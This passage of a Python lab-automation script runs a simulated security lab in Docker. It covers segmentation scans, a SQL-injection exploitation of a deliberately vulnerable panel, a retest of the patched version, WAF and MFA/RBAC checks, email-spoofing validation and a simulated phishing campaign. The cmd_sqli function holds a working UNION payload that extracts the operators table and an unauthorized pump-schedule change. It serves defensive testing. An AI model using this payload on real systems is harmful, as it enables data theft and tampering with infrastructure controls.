    ("Admin (bastion)", "IoT: borda UBS", "bastion", "10.99.0.11", "22,1883,8883", set()),
    ("Admin (bastion)", "Hub: ingestão", "bastion", "10.99.0.1", "8443", set()),
    ("Operação (ops)", "Serviços: banco", "ops", "10.30.1.20", "5432", set()),
    ("Operação (ops)", "Admin: bastion", "ops", "10.30.3.10", "22", set()),
    ("Operação (ops)", "IoT: borda UBS", "ops", "10.99.0.11", "1883,8883", set()),
    ("Operação (ops)", "Hub: ingestão", "ops", "10.99.0.1", "8443", set()),
    ("Serviços (svc)", "Admin: bastion", "svc", "10.30.3.10", "22", set()),
    ("Serviços (svc)", "IoT: borda UBS", "svc", "10.99.0.11", "1883,8883", set()),
]


def cmd_segmentacao() -> None:
    blocos = [f"Início: {datetime.now().astimezone().isoformat(timespec='seconds')} | "
              "zonas: iot (túnel 10.99.0.11-15), svc 10.30.1.0/24, ops 10.30.2.0/24, admin 10.30.3.0/24; "
              "firewall central = hub-vpn (nftables, negação por padrão)"]
    linhas, brutos = [], []
    for origem, destino, de, alvo, portas, esperadas in MATRIZ:
        r = run(nmap_cmd(de, [alvo], portas), check=False, capture=True)
        obs = portas_abertas(r.stdout).get(alvo, set())
        passou = r.returncode == 0 and obs == esperadas
        linhas.append(f"{origem:<20} | {destino:<26} | {alvo + ':' + portas:<26} | "
                      f"{', '.join(sorted(esperadas)) or 'nenhuma':<10} | {', '.join(sorted(obs)) or 'nenhuma':<10} | "
                      f"{'OK' if passou else 'FALHOU'}")
        brutos.append(f"--- {origem} -> {destino}\n{(r.stdout + r.stderr).strip()}")
    cab = (f"{'Origem':<20} | {'Destino':<26} | {'Alvo:portas':<26} | {'Esperado':<10} | {'Observado':<10} | Resultado\n"
           + "-" * 118)
    blocos.append("### Matriz de segmentação (portas abertas)\n" + cab + "\n" + "\n".join(linhas))
    print(blocos[-1])
    for c in ("hub-vpn", "ubs-vpn"):
        r = run(["docker", "exec", c, "nft", "list", "table", "inet", "vila"], check=False, capture=True)
        blocos.append(f"### Regras e contadores do firewall ({c})\n{(r.stdout + r.stderr).strip()}")
        if c == "hub-vpn":
            m = re.search(r'counter packets (\d+) bytes \d+ comment "trafego entre zonas negado"', r.stdout)
            blocos.insert(2, f"Pacotes entre zonas negados pelo firewall do hub (nftables): {m.group(1) if m else '?'}")
            print(blocos[2])
    blocos.append("### Saídas do nmap\n" + "\n\n".join(brutos))
    salvar_evidencia("B12_segmentacao.txt", blocos)


def cmd_varredura() -> None:
    tcp = ("1-1024,1433,1883,2222,3000,3306,3389,5000,5432,5601,5900,6379,8000,8080,8443,8883,"
           "9000,9200,9443,27017,55000")
    udp = "53,123,161,500,4500,51820"
    bordas = []
    for site in SITES:
        r = run(["docker", "inspect", "-f", '{{(index .NetworkSettings.Networks "vila_wan").IPAddress}}',
                 f"{site}-vpn"], check=False, capture=True)
        if r.stdout.strip():
            bordas.append(r.stdout.strip())
    blocos = [f"Início: {datetime.now().astimezone().isoformat(timespec='seconds')} | "
              f"varredura a partir da 'internet' do laboratório | hub fibra 10.250.1.10, hub 4G 10.250.2.10, "
              f"bordas {', '.join(bordas)}"]
    alvos = [("vila_wan", ["10.250.1.10", *bordas]), ("vila_lte", ["10.250.2.10"])]
    resumo = []
    for rede, ips in alvos:
        for proto, portas in (("tcp", tcp), ("udp", udp)):
            r = run(nmap_cmd(rede, ips, portas, udp=proto == "udp"), check=False, capture=True)
            abertas = portas_abertas(r.stdout)
            for ip in ips:
                resumo.append(f"{ip:<14} {proto}  portas abertas: {', '.join(sorted(abertas.get(ip, set()))) or 'nenhuma'}")
            blocos.append(f"### nmap {proto.upper()} a partir de {rede}\n{(r.stdout + r.stderr).strip()}")
    r = run(["docker", "ps", "--filter", "label=projeto=vila-aurora", "--format", "{{.Names}}\t{{.Ports}}"],
            check=False, capture=True)
    publicadas = [l for l in r.stdout.splitlines() if "->" in l]
    r = run(["docker", "run", "--rm", "--network", "vila_wan", "vila/vpn:1",
             "ping", "-c", "200", "-i", "0.01", "-q", "10.250.1.10"], check=False, capture=True)
    perda = re.search(r"(\d+(?:\.\d+)?)% packet loss", r.stdout)
    resumo.append(f"Ping em rajada (200 pacotes em ~2 s) contra o hub: {perda.group(1) if perda else '?'}% descartados "
                  "pelo limite de 5/s")
    blocos.append(f"### Ping em rajada contra o hub (limite de 5/s, rajada de 10)\n{(r.stdout + r.stderr).strip()}")
    r = run(["docker", "exec", "hub-vpn", "nft", "list", "chain", "inet", "vila", "input"], check=False, capture=True)
    blocos.append(f"### Contadores da entrada do hub\n{(r.stdout + r.stderr).strip()}")
    resumo.append(f"Portas publicadas no host pelo Docker: {', '.join(publicadas) or 'nenhuma'}")
    blocos.insert(1, "### Resumo\n" + "\n".join(resumo))
    print(blocos[1])
    salvar_evidencia("B13_varredura_externa.txt", blocos)


def pedido_valido(args) -> bool:
    return (isinstance(args, list) and 1 <= len(args) <= 6 and args[0] in PONTE_PERMITIDOS
            and all(isinstance(a, str) and re.fullmatch(r"[\w.:-]+", a) for a in args)
            and not (args[0] == "bastion" and "shell" in args))


def cmd_ponte() -> None:
    pedidos, saidas = PONTE / "pedidos", PONTE / "saidas"
    pedidos.mkdir(parents=True, exist_ok=True)
    saidas.mkdir(parents=True, exist_ok=True)
    estado = {"atual": "livre"}

    def batimento() -> None:
        while True:
            (PONTE / "ativa.txt").write_text(
                f"{datetime.now().astimezone().isoformat(timespec='seconds')} {estado['atual']}\n", encoding="utf-8")
            time.sleep(5)

    threading.Thread(target=batimento, daemon=True).start()
    print(f"Ponte ativa. Pedidos em {pedidos}")
    print("Só executa subcomandos deste script: " + ", ".join(sorted(PONTE_PERMITIDOS)))
    print("Ctrl+C encerra.\n")
    tentativas: dict[str, int] = {}
    try:
        while True:
            fila = sorted(pedidos.glob("*.json"))
            if not fila:
                time.sleep(1)
                continue
            pedido = fila[0]
            pid = pedido.stem
            try:
                args = json.loads(pedido.read_text(encoding="utf-8"))["args"]
            except (ValueError, KeyError, OSError):
                tentativas[pid] = tentativas.get(pid, 0) + 1
                if tentativas[pid] < 5:
                    time.sleep(1)
                    continue
                args = None
            os.replace(pedido, saidas / f"{pid}.pedido.json")
            log = saidas / f"{pid}.log"
            if not pedido_valido(args):
                log.write_text(f"RECUSADO: {args}\n", encoding="utf-8")
                (saidas / f"{pid}.fim").write_text("recusado\n", encoding="utf-8")
                print(f"=== [{pid}] RECUSADO: {args} ===")
                continue
            estado["atual"] = f"executando {pid}: {' '.join(args)}"
            print(f"\n=== [{pid}] python tasks.py {' '.join(args)} ===")
            env = {**os.environ, "PYTHONIOENCODING": "utf-8", "PYTHONUNBUFFERED": "1"}
            with open(log, "w", encoding="utf-8") as f:
                proc = subprocess.Popen([sys.executable, str(ROOT / "tasks.py"), *args], cwd=ROOT, env=env,
                                        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                        text=True, encoding="utf-8", errors="replace")
                for linha in proc.stdout:
                    print(linha, end="")
                    f.write(linha)
                    f.flush()
                rc = proc.wait()
            (saidas / f"{pid}.fim").write_text(f"{rc}\n", encoding="utf-8")
            estado["atual"] = "livre"
            print(f"=== [{pid}] fim (código de saída {rc}) ===")
    except KeyboardInterrupt:
        (PONTE / "ativa.txt").write_text("encerrada\n", encoding="utf-8")
        print("\nPonte encerrada.")


def cmd_firewall() -> None:
    blocos = []
    for c in ["hub-vpn", *[f"{s}-vpn" for s in SITES]]:
        r = run(["docker", "exec", c, "sh", "-c",
                 "nft delete table inet vila 2>/dev/null; nft -f /etc/vila/firewall.nft && nft list table inet vila"],
                check=False, capture=True)
        blocos.append(f"### {c} (código {r.returncode})\n{(r.stdout + r.stderr).strip()}")
    print("\n".join(blocos))


def ler_env() -> dict:
    d = {}
    if ENV_FILE.exists():
        for ln in ENV_FILE.read_text(encoding="utf-8").splitlines():
            if "=" in ln and not ln.strip().startswith("#"):
                k, v = ln.split("=", 1)
                d[k.strip()] = v.strip()
    return d


def garantir_segredos_painel() -> dict:
    env = ler_env()
    faltam = {k: secrets.token_hex(16) for k in
              ("PAINEL_SENHA_APP", "PAINEL_SENHA_RO", "PAINEL_SECRET_KEY") if not env.get(k)}
    if faltam:
        with open(ENV_FILE, "a", encoding="utf-8") as f:
            f.write("\n" + "\n".join(f"{k}={v}" for k, v in faltam.items()) + "\n")
    return {**env, **faltam}


def psql_painel(sql: str) -> str:
    r = run(["docker", "exec", "hub-postgres", "psql", "-U", "vila_admin", "-d", "painel", "-c", sql],
            check=False, capture=True)
    return (r.stdout + r.stderr).strip()


def credenciais_painel() -> dict:
    arq = ROOT / "panel" / "out" / "credenciais.txt"
    por_perfil = {}
    for l in arq.read_text(encoding="utf-8").splitlines():
        if "|" in l and not l.strip().startswith("#"):
            u, senha, perfil, secret = [x.strip() for x in l.split("|")]
            por_perfil.setdefault(perfil, (u, senha, secret))
    return por_perfil


def cliente(*args) -> subprocess.CompletedProcess:
    return run(["docker", "exec", "ops-ws", "python", "/usr/local/bin/cliente.py", *args],
               check=False, capture=True)


def resumir_sqlmap(saida: str) -> str:
    chaves = ("Parameter:", "Type:", "Title:", "injectable", "back-end DBMS",
              "available databases", "Database:", "Table:", "payload", "[WARNING]",
              "403", "forbidden", "not injectable", "all tested parameters")
    linhas, na_tabela = [], False
    for ln in saida.splitlines():
        t = ln.rstrip()
        if set(t.strip()) <= {"+", "-"} and len(t) > 3:
            na_tabela = not na_tabela or na_tabela
            linhas.append(t)
        elif na_tabela and t.strip().startswith("|"):
            linhas.append(t)
        elif any(k.lower() in t.lower() for k in chaves):
            linhas.append(t.strip())
    vistos, saida_f = set(), []
    for l in linhas:
        if l not in vistos or l.startswith("|") or set(l.strip()) <= {"+", "-"}:
            vistos.add(l)
            saida_f.append(l)
    return "\n".join(saida_f[:120]) or "(sqlmap não retornou linhas de interesse)"


def cmd_painel(acao: str = "status") -> None:
    env = garantir_segredos_painel()
    admin = env.get("POSTGRES_ADMIN_PASSWORD", "")
    run(compose_hub("build", "painel", "ops-ws"))
    saida = ROOT / "panel" / "out"
    saida.mkdir(parents=True, exist_ok=True)
    r = run(["docker", "run", "--rm", "--network", "vila_svc",
             "-e", f"PGPASSWORD={admin}", "-e", f"SENHA_APP={env['PAINEL_SENHA_APP']}",
             "-e", f"SENHA_RO={env['PAINEL_SENHA_RO']}", "-e", "DADOS=/dados", "-e", "SAIDA=/out",
             "--mount", f"type=bind,source={ROOT / 'data' / 'synthetic' / 'output'},target=/dados,readonly",
             "--mount", f"type=bind,source={saida},target=/out",
             "vila/painel:1", "python", "carga.py"], check=False, capture=True)
    print(r.stdout, r.stderr)
    if r.returncode != 0:
        print("Falha na carga. O ambiente (postgres) está no ar? Rode antes:  python tasks.py up")
        return
    run(compose_hub("up", "-d", "painel", "painel-vuln", "waf", "ops-ws"))
    time.sleep(6)
    for ip, nome in [("10.30.2.20", "corrigido"), ("10.30.2.21", "vulneravel")]:
        h = cliente("get", f"http://{ip}:8000", "/healthz", "/trabalho/h.cookie")
        print(f"painel {nome} ({ip}): {(h.stdout + h.stderr).strip()}")
    print("Credenciais sintéticas em panel/out/credenciais.txt (fora do versionamento).")


def cmd_sqli() -> None:
    cp = credenciais_painel()
    u, senha, _ = cp["operador"]
    alvo = "http://10.30.2.21:8000"
    psql_painel("UPDATE agendamentos_bomba SET hora_inicio='06:00', hora_fim='08:00', "
                "atualizado_por='carga' WHERE id=1")
    blocos = [f"Alvo: painel VULNERÁVEL {alvo} | conta de operador obtida por phishing (simulado): {u}",
              "Reproduz o INC-VA-0712: login do operador -> SQLi no histórico -> alteração do agendamento da bomba."]
    blocos.append("### Agendamento das bombas ANTES\n" + psql_painel(
        "SELECT id, espaco, hora_inicio, hora_fim, atualizado_por FROM agendamentos_bomba ORDER BY id"))
    r = cliente("login", alvo, u, senha, "/trabalho/op.cookie")
    blocos.append("### 1. Login com a credencial de operador\n" + (r.stdout + r.stderr).strip())
    r = run(["docker", "exec", "ops-ws", "sqlmap", "-u", f"{alvo}/historico?q=teste&espaco=",
             "--load-cookies=/trabalho/op.cookie", "-p", "q", "--dbms=postgresql", "--batch",
             "--flush-session", "--level=5", "--risk=3"], check=False, capture=True)
    blocos.append("### 2. sqlmap confirma a injeção no campo de busca (tipos encontrados)\n"
                  + resumir_sqlmap(r.stdout + r.stderr))
    pl = "zzz' UNION SELECT NULL,NULL,username,perfil,NULL,NULL,NULL FROM operadores-- "
    ext = ("import urllib.request as R,http.cookiejar as C,urllib.parse as P,re;"
           "j=C.MozillaCookieJar('/trabalho/op.cookie');j.load(ignore_discard=True,ignore_expires=True);"
           "o=R.build_opener(R.HTTPCookieProcessor(j));"
           "u='http://10.30.2.21:8000/historico?q='+P.quote(\"" + pl + "\")+'&espaco=';"
           "t=o.open(u,timeout=20).read().decode();"
           "pares=[(c[1].strip(),c[2].strip()) for ln in re.findall(r'<tr>(.*?)</tr>',t,re.S)"
           " for c in [re.findall(r'<td>(.*?)</td>',ln,re.S)] if len(c)>=3];"
           "print('Operadores extraidos da tabela via UNION:',len(pares));"
           "print('usuario | perfil');"
           "print(chr(10).join(' '+a+' | '+b for a,b in pares[:8]));"
           "print('  ... (+%d)' % (len(pares)-8) if len(pares)>8 else '')")
    r = run(["docker", "exec", "ops-ws", "python", "-c", ext], check=False, capture=True)
    blocos.append("### 3. Extração da tabela de operadores via UNION (dados sensíveis vazados)\n"
                  + (r.stdout + r.stderr).strip())
    r = cliente("post", alvo, "/bomba", "/trabalho/op.cookie", "id=1", "inicio=00:00", "fim=23:59")
    blocos.append("### 4. Operador altera o agendamento da bomba (painel legado não aplica RBAC)\n"
                  + (r.stdout + r.stderr).strip())
    blocos.append("### Agendamento das bombas DEPOIS\n" + psql_painel(
        "SELECT id, espaco, hora_inicio, hora_fim, atualizado_por FROM agendamentos_bomba ORDER BY id"))
    for b in blocos:
        print(b)
    salvar_evidencia("B14_sqli_exploracao.txt", blocos)


def cmd_reteste() -> None:
    cp = credenciais_painel()
    u, senha, secret = cp["operador"]
    alvo = "http://10.30.2.20:8000"
    blocos = [f"Alvo: painel CORRIGIDO {alvo} (sem WAF) | mesma conta de operador: {u}",
              "Mesmo ataque do B14 contra a versão com consultas parametrizadas, validação e privilégio mínimo."]
    psql_painel("UPDATE agendamentos_bomba SET hora_inicio='06:00', hora_fim='08:00', "
                "atualizado_por='carga' WHERE id=1")
    r = cliente("login", alvo, u, senha, "/trabalho/op2.cookie", secret)
    blocos.append("### 1. Login do operador (com MFA, para o sqlmap alcançar a busca)\n" + (r.stdout + r.stderr).strip())
    r = run(["docker", "exec", "ops-ws", "sqlmap", "-u", f"{alvo}/historico?q=teste&espaco=",
             "--load-cookies=/trabalho/op2.cookie", "-p", "q", "--dbms=postgresql", "--batch",
             "--flush-session", "--level=5", "--risk=3"], check=False, capture=True)
    blocos.append("### 2. sqlmap no mesmo esforço do B14 (esperado: parâmetro NÃO injetável)\n"
                  + resumir_sqlmap(r.stdout + r.stderr))
    pl = "zzz' UNION SELECT NULL,NULL,username,perfil,NULL,NULL,NULL FROM operadores-- "
    ext = ("import urllib.request as R,http.cookiejar as C,urllib.parse as P,re;"
           "j=C.MozillaCookieJar('/trabalho/op2.cookie');j.load(ignore_discard=True,ignore_expires=True);"
           "o=R.build_opener(R.HTTPCookieProcessor(j));"
           "u='http://10.30.2.20:8000/historico?q='+P.quote(\"" + pl + "\")+'&espaco=';"
           "t=o.open(u,timeout=20).read().decode();"
           "pares=[c for ln in re.findall(r'<tr>(.*?)</tr>',t,re.S)"
           " for c in [re.findall(r'<td>(.*?)</td>',ln,re.S)] if len(c)>=3];"
           "print('Mesmo payload UNION do B14 -> operadores vazados:',len(pares));"
           "print('O texto foi tratado como literal de busca (parametrizado), nao como SQL.')")
    r = run(["docker", "exec", "ops-ws", "python", "-c", ext], check=False, capture=True)
    blocos.append("### 3. Mesmo payload UNION do B14 (esperado: 0 operadores vazados)\n" + (r.stdout + r.stderr).strip())
    r = cliente("post", alvo, "/bomba", "/trabalho/op2.cookie", "id=1", "inicio=00:00", "fim=23:59")
    blocos.append("### 4. Operador tenta alterar o agendamento (esperado: 403 por RBAC)\n" + (r.stdout + r.stderr).strip())
    blocos.append("### Agendamento das bombas (esperado: inalterado)\n" + psql_painel(
        "SELECT id, espaco, hora_inicio, hora_fim, atualizado_por FROM agendamentos_bomba ORDER BY id"))
    for b in blocos:
        print(b)
    salvar_evidencia("B15_reteste_corrigido.txt", blocos)


def cmd_waf() -> None:
    cp = credenciais_painel()
    u, senha, _ = cp["operador"]
    alvo = "http://10.30.2.10:8080"
    run(["docker", "exec", "waf", "sh", "-c", ": > /var/log/nginx/error.log 2>/dev/null || true"], check=False)
    blocos = [f"Alvo: WAF {alvo} (ModSecurity + OWASP CRS) na frente do painel vulnerável",
              "Mesmo ataque do B14, agora atravessando o WAF. Esperado: requisições de SQLi bloqueadas com 403."]
    r = cliente("login", alvo, u, senha, "/trabalho/waf.cookie")
    blocos.append("### 1. Login atravessando o WAF (tráfego legítimo passa)\n" + (r.stdout + r.stderr).strip())
    r = run(["docker", "exec", "ops-ws", "sqlmap", "-u", f"{alvo}/historico?q=teste&espaco=",
             "--load-cookies=/trabalho/waf.cookie", "-p", "q", "--dbms=postgresql", "--batch",
             "--flush-session", "--technique=BEU", "--threads=2"], check=False, capture=True)
    blocos.append("### 2. SQL Injection atravessando o WAF (esperado: 403)\n" + resumir_sqlmap(r.stdout + r.stderr))
    r = run(["docker", "logs", "--since", "3m", "waf"], check=False, capture=True)
    log = r.stdout + r.stderr
    bloqueios = [l for l in log.splitlines() if "Access denied with code 403" in l]
    regras = sorted(set(re.findall(r'"ruleId":"(94\d{4})"', log)) | set(re.findall(r'\[id "(94\d{4})"\]', log)))
    mensagens = sorted(set(re.findall(r'"message":"((?:SQL Injection|Detects SQL|Looking for[^"]*sql)[^"]*)"', log)))
    resumo = [f"Requisições de ataque bloqueadas com 403: {len(bloqueios)}",
              f"Regras do OWASP CRS acionadas (família 94x): {', '.join(regras) or 'n/d'}",
              "Mensagens de SQLi do CRS:"] + ["  - " + m for m in mensagens[:6]]
    if bloqueios:
        resumo += ["", "Exemplo de bloqueio (nginx/ModSecurity):", bloqueios[0][:400]]
    blocos.append("### 3. Log do WAF (ModSecurity + OWASP CRS bloqueando)\n" + "\n".join(resumo))
    for b in blocos:
        print(b)
    salvar_evidencia("B16_waf.txt", blocos)


def cmd_rbac() -> None:
    cp = credenciais_painel()
    alvo = "http://10.30.2.20:8000"
    casos = [
        ("operador", "GET", "/historico", "permitido", 200),
        ("operador", "POST", "/bomba", "negado (só técnico/coordenação)", 403),
        ("operador", "GET", "/usuarios", "negado (só coordenação)", 403),
        ("tecnico", "POST", "/bomba", "permitido", 200),
        ("tecnico", "GET", "/usuarios", "negado (só coordenação)", 403),
        ("coordenacao", "GET", "/usuarios", "permitido", 200),
        ("coordenacao", "POST", "/bomba", "permitido", 200),
        ("auditor", "GET", "/historico", "permitido", 200),
        ("auditor", "POST", "/bomba", "negado (auditor é só leitura)", 403),
    ]
    blocos = [f"Alvo: painel CORRIGIDO {alvo} | MFA (TOTP) + RBAC com 4 perfis (RT-09)"]
    linhas = []
    for perfil in ("operador", "tecnico", "coordenacao", "auditor"):
        u, senha, secret = cp[perfil]
        ck = f"/trabalho/rbac_{perfil}.cookie"
        semcod = cliente("login", alvo, u, senha, ck + ".nomfa")
        g = run(["docker", "exec", "ops-ws", "python", "/usr/local/bin/cliente.py", "get", alvo,
                 "/historico", ck + ".nomfa"], check=False, capture=True)
        mfa_bloqueia = "/mfa" in g.stdout
        linhas.append(f"{perfil:12} | login sem código MFA -> /historico redireciona para /mfa: "
                      f"{'sim (bloqueado)' if mfa_bloqueia else 'NÃO'}")
        cliente("login", alvo, u, senha, ck, secret)
    blocos.append("### MFA obrigatório (antes de confirmar o código, nenhuma tela abre)\n" + "\n".join(linhas))
    matriz = [f"{'Perfil':12} | {'Ação':16} | {'Esperado':34} | HTTP | Resultado"]
    for perfil, metodo, caminho, desc, esperado in casos:
        u, senha, secret = cp[perfil]
        ck = f"/trabalho/rbac_{perfil}.cookie"
        extra = ["id=1", "inicio=06:00", "fim=08:00"] if (metodo == "POST" and caminho == "/bomba") else []
        r = cliente(metodo.lower(), alvo, caminho, ck, *extra)
        obtido = next((int(p.split("=")[1]) for p in (r.stdout + r.stderr).split()
                       if p.startswith("status=")), -1)
        ok = "OK" if obtido == esperado else "FALHOU"
        matriz.append(f"{perfil:12} | {metodo + ' ' + caminho:16} | {desc:34} | {obtido:4} | {ok}")
    blocos.append("### Matriz de permissões (RBAC)\n" + "\n".join(matriz))
    for b in blocos:
        print(b)
    salvar_evidencia("B17_mfa_rbac.txt", blocos)


def cmd_dns(acao: str = "status") -> None:
    run(compose_hub("build", "mail-tools"))
    saida_mail = ROOT / "infra" / "mail" / "out"
    saida_mail.mkdir(parents=True, exist_ok=True)
    r = run(["docker", "run", "--rm", "-v", f"{saida_mail}:/chaves", "vila/mail:1",
             "python", "gerar_dkim.py"], check=False, capture=True)
    linha_dkim = next((l for l in reversed(r.stdout.splitlines()) if "_domainkey" in l), "")
    if not linha_dkim:
        print("Falha ao gerar a chave DKIM:\n" + r.stdout + r.stderr)
        return
    modelo = (ROOT / "infra" / "dns" / "db.vilaaurora.test.modelo").read_text(encoding="utf-8")
    zona_dir = ROOT / "infra" / "dns" / "out"
    zona_dir.mkdir(parents=True, exist_ok=True)
    (zona_dir / "db.vilaaurora.test").write_text(modelo.replace("__DKIM__", linha_dkim), encoding="utf-8")
    run(compose_hub("up", "-d", "coredns", "mailpit", "mail-tools"))
    time.sleep(6)

    consulta = ("import dns.resolver\n"
                "for nome in ['vilaaurora.test','_dmarc.vilaaurora.test','sel1._domainkey.vilaaurora.test']:\n"
                " try:\n"
                "  for r in dns.resolver.resolve(nome,'TXT'):\n"
                "   v=''.join(s.decode() for s in r.strings)\n"
                "   print(nome,'TXT',(v[:90]+'...') if len(v)>90 else v)\n"
                " except Exception as e: print(nome,'erro',e)")
    r = run(["docker", "exec", "mail-tools", "python", "-c", consulta], check=False, capture=True)
    blocos = ["Domínio fictício vilaaurora.test servido pelo CoreDNS (10.40.0.2); Mailpit como caixa de entrada.",
              "### Registros publicados no DNS (SPF, DMARC, DKIM)\n" + (r.stdout + r.stderr).strip()]
    for tipo in ("legit", "forjado"):
        run(["docker", "exec", "mail-tools", "python", "mailer.py", tipo], check=False, capture=True)
    for tipo, rotulo in (("legit", "1. E-mail LEGÍTIMO (coordenação, assinado, do IP autorizado)"),
                         ("forjado", "2. E-mail FORJADO (spoof de @vilaaurora.test, IP externo, sem DKIM)")):
        r = run(["docker", "exec", "mail-tools", "python", "validador.py", tipo], check=False, capture=True)
        blocos.append(f"### {rotulo}\n" + (r.stdout + r.stderr).strip())
    for b in blocos:
        print(b)
    salvar_evidencia("B18_dns_email.txt", blocos)


def cmd_phishing(acao: str = "status") -> None:
    run(compose_hub("build", "mail-tools"))
    run(compose_hub("up", "-d", "coredns", "mailpit", "gophish", "mail-tools"))
    print("Aguardando o Gophish inicializar o banco e o usuário admin...")
    time.sleep(18)
    r = run(["docker", "exec", "mail-tools", "python", "campanha.py"], check=False, capture=True)
    blocos = ["Campanha de phishing SIMULADA (Gophish) somente contra contas fictícias @vilaaurora.test.",
              "Ética (briefing): nenhuma pessoa real; o funil (abertura/clique/submissão) é simulado no laboratório.",
              "### Execução da campanha e métricas\n" + (r.stdout + r.stderr).strip()]
    mp = ("import urllib.request,json;"
          "d=json.load(urllib.request.urlopen('http://10.40.0.3:8025/api/v1/messages?limit=3',timeout=10));"
          "print('mensagens no Mailpit:',d.get('messages_count'));"
          "[print('  -',m.get('From',{}).get('Address'),'->',m.get('Subject')) for m in d.get('messages',[])]")
    r2 = run(["docker", "exec", "mail-tools", "python", "-c", mp], check=False, capture=True)
    blocos.append("### Caixa de entrada (Mailpit) com os e-mails da campanha\n" + (r2.stdout + r2.stderr).strip())
    for b in blocos:
        print(b)
    salvar_evidencia("B19_phishing.txt", blocos)


SIEM_SCHEMA = """
CREATE TABLE IF NOT EXISTS eventos (
    id BIGSERIAL PRIMARY KEY, ts TIMESTAMPTZ NOT NULL, fonte TEXT NOT NULL,
    host TEXT, severidade TEXT NOT NULL DEFAULT 'info', mensagem TEXT NOT NULL);
CREATE INDEX IF NOT EXISTS eventos_fonte_ts ON eventos (fonte, ts);
DELETE FROM eventos a USING eventos b
  WHERE a.id > b.id AND a.ts = b.ts AND a.host IS NOT DISTINCT FROM b.host AND a.mensagem = b.mensagem;
CREATE UNIQUE INDEX IF NOT EXISTS eventos_unico ON eventos (ts, host, md5(mensagem));
CREATE TABLE IF NOT EXISTS alertas (
    id BIGSERIAL PRIMARY KEY, detectado_em TIMESTAMPTZ NOT NULL DEFAULT now(),
    regra TEXT NOT NULL, severidade TEXT NOT NULL, fonte TEXT, host TEXT,
    detalhe TEXT, evento_ts TIMESTAMPTZ, mttd_seg NUMERIC);
CREATE TABLE IF NOT EXISTS soar_acoes (
    id BIGSERIAL PRIMARY KEY, ts TIMESTAMPTZ NOT NULL DEFAULT now(), alerta_id BIGINT,
    regra TEXT, acao TEXT NOT NULL, risco TEXT NOT NULL, status TEXT NOT NULL,
    aprovado_por TEXT, detalhe TEXT);
"""

SIEM_RETENCAO = "90 days"     # retenção dos eventos centralizados (E1, seção 8.3)
SIEM_JANELA = "180 minutes"   # janela avaliada pelas regras de detecção (a mesma da coleta)

SIEM_FONTES = {
    "dispositivos": [f"{x}-sensores" for x in SITES],
    "broker": [f"{x}-broker" for x in SITES],
    "vpn": ["hub-vpn"] + [f"{x}-vpn" for x in SITES],
    "web": ["painel", "painel-vuln", "waf"],
    "banco": ["hub-postgres"],
    "so": ["hub-ingest", "hub-ntp", "hub-bastion", "coredns", "gophish"],
}


def psql_db(db: str, sql: str) -> str:
    r = run(["docker", "exec", "hub-postgres", "psql", "-U", "vila_admin", "-d", db, "-c", sql],
            check=False, capture=True)
    return (r.stdout + r.stderr).strip()


def psql_escalar(db: str, sql: str) -> str:
    r = run(["docker", "exec", "hub-postgres", "psql", "-U", "vila_admin", "-d", db, "-tA", "-c", sql],
            check=False, capture=True)
    return r.stdout.strip()


def siem_preparar() -> None:
    run(["docker", "exec", "hub-postgres", "sh", "-c",
         "psql -U vila_admin -d postgres -tc \"SELECT 1 FROM pg_database WHERE datname='siem'\" | grep -q 1 "
         "|| psql -U vila_admin -d postgres -c 'CREATE DATABASE siem'"], check=False, capture=True)
    run(["docker", "exec", "-i", "hub-postgres", "psql", "-U", "vila_admin", "-d", "siem"],
        check=False, capture=True, _input=SIEM_SCHEMA)


def severidade(msg: str) -> str:
    m = msg.lower()
    if any(k in m for k in ("error", "fatal", "denied", "recusado", "fail", "falha", "403", "revoked", "negad")):
        return "alta"
    if any(k in m for k in ("failover", "alarme", "offline", "warning", "aviso", "reconex")):
        return "media"
    return "info"


def siem_coletar() -> dict:
    import io
    linhas_tsv = io.StringIO()
    contagem = {}
    for fonte, containers in SIEM_FONTES.items():
        n = 0
        for c in containers:
            r = run(["docker", "logs", "-t", "--since", "180m", "--tail", "200", c], check=False, capture=True)
            for ln in (r.stdout + r.stderr).splitlines():
                ln = ln.strip()
                if not ln or " " not in ln:
                    continue
                ts, _, msg = ln.partition(" ")
                if "T" not in ts or ":" not in ts:
                    continue
                msg = msg.replace("\t", " ").replace("\\", " ")[:500]
                linhas_tsv.write(f"{ts}\t{fonte}\t{c}\t{severidade(msg)}\t{msg}\n")
                n += 1
        contagem[fonte] = contagem.get(fonte, 0) + n
    aud = run(["docker", "exec", "hub-postgres", "psql", "-U", "vila_admin", "-d", "painel", "-F", "\t",
               "-A", "-t", "-c", "SELECT ts, usuario, perfil, acao, coalesce(detalhe,''), coalesce(ip,'') "
               "FROM auditoria WHERE ts > now() - interval '12 hours' ORDER BY ts"], check=False, capture=True)
    for ln in aud.stdout.splitlines():
        p = ln.split("\t")
        if len(p) >= 6 and len(p[0]) >= 4 and p[0][:4].isdigit():
            msg = f"auditoria painel: usuario={p[1]} perfil={p[2]} acao={p[3]} detalhe={p[4]} ip={p[5]}"
            linhas_tsv.write(f"{p[0]}\tweb\tpainel\t{severidade(p[3] + p[4])}\t{msg[:500]}\n")
            contagem["web"] = contagem.get("web", 0) + 1
    # Acumula os eventos sem apagar a base: duplicados são ignorados e o que passa da retenção sai.
    run(["docker", "exec", "-i", "hub-postgres", "psql", "-U", "vila_admin", "-d", "siem"],
        check=False, capture=True, _input=siem_script_carga(linhas_tsv.getvalue()))
    return contagem


def siem_script_carga(tsv: str) -> str:
    return ("CREATE TEMP TABLE novos (ts TIMESTAMPTZ, fonte TEXT, host TEXT, severidade TEXT, mensagem TEXT);\n"
            "COPY novos FROM STDIN;\n" + tsv + "\\.\n"
            "INSERT INTO eventos (ts, fonte, host, severidade, mensagem) "
            "SELECT ts, fonte, host, severidade, mensagem FROM novos ON CONFLICT DO NOTHING;\n"
            f"DELETE FROM eventos WHERE ts < now() - interval '{SIEM_RETENCAO}';\n")


def cmd_siem(acao: str = "status") -> None:
    siem_preparar()
    contagem = siem_coletar()
    blocos = ["SIEM do laboratório: coletor em Python centraliza os logs das fontes no PostgreSQL (base 'siem').",
              "Fontes exigidas pelo RT-12: dispositivos, broker, VPN, web, banco de dados e sistema operacional.",
              "Retenção: eventos acumulados sem duplicação e mantidos por 90 dias."]
    tabela = psql_db("siem", "SELECT fonte, count(*) AS eventos, min(ts) AS primeiro, max(ts) AS ultimo "
                     "FROM eventos GROUP BY fonte ORDER BY fonte")
    blocos.append("### Eventos centralizados por fonte\n" + tabela)
    amostra = psql_db("siem", "SELECT to_char(ts,'HH24:MI:SS') h, fonte, severidade, left(mensagem,70) "
